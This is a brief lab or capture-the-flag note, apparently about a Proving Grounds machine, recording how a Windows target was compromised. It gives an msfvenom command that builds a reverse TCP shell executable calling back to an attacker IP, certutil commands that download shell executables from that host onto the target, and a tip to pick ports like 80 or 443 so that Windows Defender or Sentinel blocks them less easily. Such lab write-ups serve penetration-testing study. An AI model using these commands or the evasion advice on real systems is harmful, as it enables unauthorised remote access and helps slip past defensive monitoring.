Similar to the PG Nickel.
One thing might worth to mention is the port.
It may caused by windows defender or sentinal. Use the port that won't be blocked easily.
e.g. 80 443 or the port that using by the web app themselves


### php-reverse-shell won't work. 
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.127 LPORT=4443 -f exe > shell2.exe
```

### shell and privilege
```
certutil -urlcache -f http://192.168.49.127/shell.exe shell.exe
certutil -urlcache -f http://192.168.49.127/shell2.exe shell2.exe
```